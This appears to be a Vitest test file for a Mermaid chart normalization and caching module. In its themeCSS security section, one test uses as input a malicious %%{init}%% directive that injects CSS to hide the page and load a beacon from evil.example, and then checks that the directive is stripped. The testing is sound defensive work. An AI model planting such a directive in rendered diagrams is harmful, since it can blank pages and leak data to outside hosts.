import { describe, expect, it, vi, beforeEach } from "vitest";
import {
  normalizeMermaidChart,
  cleanupErrorCache,
  errorCache,
  mermaidCache,
} from "./mermaidConfig";
import { getMermaid } from "./mermaidRenderManager";

// Mock console.warn
global.console = {
  ...console,
  warn: vi.fn(),
};

describe("mermaidConfig", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    errorCache.clear();
    mermaidCache.clear();
  });

  describe("normalizeMermaidChart", () => {
    describe("Gantt chart punctuation normalization", () => {
      it("normalizes full-width colons in gantt charts", () => {
        const input = [
          "gantt",
          "  title 项目计划",
          "  dateFormat YYYY-MM-DD",
          "  section 需求阶段",
          "  需求收集 ：done， d1， 2025－01－01， 3d",
        ].join("\n");

        const normalized = normalizeMermaidChart(input);

        expect(normalized).toContain("需求收集 :done, d1, 2025-01-01, 3d");
        expect(normalized).not.toContain("：");
      });

      it("normalizes full-width commas in gantt charts", () => {
        const input = ["gantt", "  task1 ，a，b", "  task2（c，d）"].join("\n");
        const normalized = normalizeMermaidChart(input);

        expect(normalized).toContain(",");
        expect(normalized).toContain(",");
      });

      it("normalizes full-width semicolons in gantt charts", () => {
        const input = ["gantt", "  task1 ；phase1；phase2"].join("\n");
        const normalized = normalizeMermaidChart(input);

        expect(normalized).toContain(";");
        expect(normalized).toContain(";");
      });

      it("normalizes full-width parentheses in gantt charts", () => {
        const input = ["gantt", "  task （important）"].join("\n");
        const normalized = normalizeMermaidChart(input);

        expect(normalized).toContain("(important)");
        expect(normalized).not.toContain("（");
        expect(normalized).not.toContain("）");
      });

      it("normalizes full-width dashes in gantt charts", () => {
        const input = ["gantt", "  task－1 : urgent"].join("\n");
        const normalized = normalizeMermaidChart(input);

        expect(normalized).toContain("-");
        expect(normalized).not.toContain("－");
      });

      it("combines multiple full-width punctuations", () => {
        const input = ["gantt", "  任务A ：阶段1（开始）；阶段2（结束）"].join("\n");
        const normalized = normalizeMermaidChart(input);

        expect(normalized).toContain(":");
        expect(normalized).toContain(";");
        expect(normalized).toContain("(");
        expect(normalized).toContain(")");
      });
    });
  });

  describe("Non-gantt chart handling", () => {
    it("does not apply gantt punctuation normalization to non-gantt charts", () => {
      const input = "graph TD\nA[任务：进行中] --> B[完成]";
      const normalized = normalizeMermaidChart(input);

      expect(normalized).toBe(input);
    });

    it("preserves chart without square brackets", () => {
      const input = "graph TD\nA --> B";
      const normalized = normalizeMermaidChart(input);

      expect(normalized).toBe(input);
    });
  });

  describe("Label escaping in square brackets", () => {
    it("escapes newlines in labels", () => {
      const input = "graph TD\nA[label with\nnewline] --> B";
      const normalized = normalizeMermaidChart(input);

      expect(normalized).toContain("<br/>");
      expect(normalized).not.toMatch(/\[label with\nnewline\]/);
    });

    it("escapes parentheses in labels when not shape", () => {
      const input = "graph TD\nA[Task (important)] --> B";
      const normalized = normalizeMermaidChart(input);

      expect(normalized).toContain("&#40;");
      expect(normalized).toContain("&#41;");
    });

    it("does not escape parentheses when they form a shape", () => {
      const input = "graph TD\nA[(shape)] --> B";
      const normalized = normalizeMermaidChart(input);

      expect(normalized).toContain("[(shape)]");
      expect(normalized).not.toContain("&#40;");
    });

    it("escapes @ symbol in labels", () => {
      const input = "graph TD\nA[user@email] --> B";
      const normalized = normalizeMermaidChart(input);

      expect(normalized).toContain("&#64;");
    });

    it("escapes multiple special characters in same label", () => {
      const input = "graph TD\nA[task (important) @work] --> B";
      const normalized = normalizeMermaidChart(input);

      expect(normalized).toContain("&#40;");
      expect(normalized).toContain("&#41;");
      expect(normalized).toContain("&#64;");
    });

    it("handles label with newline and parentheses", () => {
      const input = "graph TD\nA[task\n(urgent)] --> B";
      const normalized = normalizeMermaidChart(input);

      expect(normalized).toContain("<br/>");
      expect(normalized).toContain("&#40;");
      expect(normalized).toContain("&#41;");
    });

    it("preserves label without special characters", () => {
      const input = "graph TD\nA[simple label] --> B";
      const normalized = normalizeMermaidChart(input);

      expect(normalized).toBe(input);
    });

    it("handles empty label", () => {
      const input = "graph TD\nA[] --> B";
      const normalized = normalizeMermaidChart(input);

      expect(normalized).toBe(input);
    });

    it("handles label with only whitespace", () => {
      const input = "graph TD\nA[   ] --> B";
      const normalized = normalizeMermaidChart(input);

      expect(normalized).toBe(input);
    });

    it("handles multiple labels with different special characters", () => {
      const input = [
        "graph TD",
        "A[simple] --> B[task (important)]",
        "B --> C[user@email]",
        "C --> D[(shape)]",
      ].join("\n");
      const normalized = normalizeMermaidChart(input);

      expect(normalized).toContain("[simple]");
      expect(normalized).toContain("&#40;");
      expect(normalized).toContain("&#41;");
      expect(normalized).toContain("&#64;");
      expect(normalized).toContain("[(shape)]");
    });

    it("handles Windows-style newlines (CRLF)", () => {
      const input = "graph TD\r\nA[label\r\nwith\r\ncrlf] --> B";
      const normalized = normalizeMermaidChart(input);

      expect(normalized).toContain("<br/>");
    });
  });

  describe("cleanupErrorCache", () => {
    it("removes entries older than 5 minutes", () => {
      const now = Date.now();
      const fiveMinutes = 5 * 60 * 1000;

      // Add old entry
      errorCache.set("old-chart", {
        count: 1,
        lastSeen: now - fiveMinutes - 1000,
      });

      // Add recent entry
      errorCache.set("recent-chart", {
        count: 2,
        lastSeen: now - 1000,
      });

      // Add entry just under 5 minute threshold (should NOT be removed)
      errorCache.set("threshold-chart", {
        count: 1,
        lastSeen: now - fiveMinutes + 1,
      });

      cleanupErrorCache();

      expect(errorCache.has("old-chart")).toBe(false);
      expect(errorCache.has("recent-chart")).toBe(true);
      // Entry exactly at threshold should NOT be removed (> check, not >=)
      expect(errorCache.has("threshold-chart")).toBe(true);
    });

    it("handles empty cache", () => {
      cleanupErrorCache();
      expect(errorCache.size).toBe(0);
    });

    it("preserves all entries when all are recent", () => {
      const now = Date.now();

      errorCache.set("chart1", { count: 1, lastSeen: now });
      errorCache.set("chart2", { count: 2, lastSeen: now - 1000 });
      errorCache.set("chart3", { count: 3, lastSeen: now - 60000 });

      cleanupErrorCache();

      expect(errorCache.size).toBe(3);
    });

    it("removes all entries when all are old", () => {
      const now = Date.now();
      const fiveMinutes = 5 * 60 * 1000;

      errorCache.set("chart1", { count: 1, lastSeen: now - fiveMinutes - 1000 });
      errorCache.set("chart2", { count: 2, lastSeen: now - fiveMinutes - 2000 });

      cleanupErrorCache();

      expect(errorCache.size).toBe(0);
    });

    it("handles multiple cleanup calls", () => {
      const now = Date.now();

      errorCache.set("chart1", { count: 1, lastSeen: now - 1000 });
      cleanupErrorCache();
      expect(errorCache.size).toBe(1);

      // Second call should be safe
      cleanupErrorCache();
      expect(errorCache.size).toBe(1);
    });
  });

  describe("mermaidCache", () => {
    it("can store and retrieve cached SVG data", () => {
      const key = "test-chart";
      const data = {
        svg: "<svg>test</svg>",
        height: 100,
        svgWidth: 200,
        svgHeight: 150,
      };

      mermaidCache.set(key, data);
      expect(mermaidCache.get(key)).toEqual(data);
    });

    it("can clear cache entries", () => {
      const key = "test-chart";
      mermaidCache.set(key, {
        svg: "<svg>test</svg>",
        height: 100,
        svgWidth: 200,
        svgHeight: 150,
      });

      mermaidCache.delete(key);
      expect(mermaidCache.has(key)).toBe(false);
    });

    it("maintains separate entries for different keys", () => {
      const data1 = {
        svg: "<svg>1</svg>",
        height: 100,
        svgWidth: 200,
        svgHeight: 150,
      };
      const data2 = {
        svg: "<svg>2</svg>",
        height: 200,
        svgWidth: 300,
        svgHeight: 250,
      };

      mermaidCache.set("chart1", data1);
      mermaidCache.set("chart2", data2);

      expect(mermaidCache.get("chart1")).toEqual(data1);
      expect(mermaidCache.get("chart2")).toEqual(data2);
    });
  });

  describe("security: themeCSS lock (issue #38)", () => {
    // mermaid 11.15's `%%{init:{"themeCSS":"..."}}%%` directive splices raw,
    // unscoped CSS into the rendered <style> block (bypassing the
    // #<svgId>-namespacing every other diagram style rule goes through) and
    // isn't covered by mermaid's default `secure` list. The lazy `getMermaid()`
    // loader runs a base `mermaid.initialize()` that adds it (+ themeVariables,
    // fontFamily) to `secure`, so mermaid itself deletes those keys from any
    // per-diagram directive before it's merged into the render config —
    // regardless of what sanitizeSvg.ts does downstream.
    it("locks themeCSS, themeVariables and fontFamily via mermaid's secure config", async () => {
      const mermaid = await getMermaid();
      const secure = mermaid.mermaidAPI.getConfig().secure ?? [];
      expect(secure).toContain("themeCSS");
      expect(secure).toContain("themeVariables");
      expect(secure).toContain("fontFamily");
    });

    it("strips a malicious %%{init}%% themeCSS directive before it reaches the render config", async () => {
      const mermaid = await getMermaid();
      const chart = [
        '%%{init: {"themeCSS": "body{display:none} [data-exfil]{background:url(https://evil.example/beacon)}"}}%%',
        "flowchart TD",
        "A-->B",
      ].join("\n");

      const { config } = await mermaid.parse(chart, { suppressErrors: false });

      expect(config).not.toHaveProperty("themeCSS");
    });

    it("still allows non-CSS-bearing %%{init}%% directive keys through", async () => {
      const mermaid = await getMermaid();
      const chart = [
        '%%{init: {"flowchart": {"curve": "linear"}}}%%',
        "flowchart TD",
        "A-->B",
      ].join("\n");

      const { config } = await mermaid.parse(chart, { suppressErrors: false });

      expect(config).toMatchObject({ flowchart: { curve: "linear" } });
    });
  });

  describe("errorCache", () => {
    it("can store and retrieve error data", () => {
      const key = "error-chart";
      const data = { count: 2, lastSeen: Date.now() };

      errorCache.set(key, data);
      expect(errorCache.get(key)).toEqual(data);
    });

    it("can increment error count", () => {
      const key = "increment-chart";
      errorCache.set(key, { count: 1, lastSeen: Date.now() });

      const entry = errorCache.get(key)!;
      entry.count++;
      entry.lastSeen = Date.now();
      errorCache.set(key, entry);

      expect(errorCache.get(key)?.count).toBe(2);
    });
  });
});
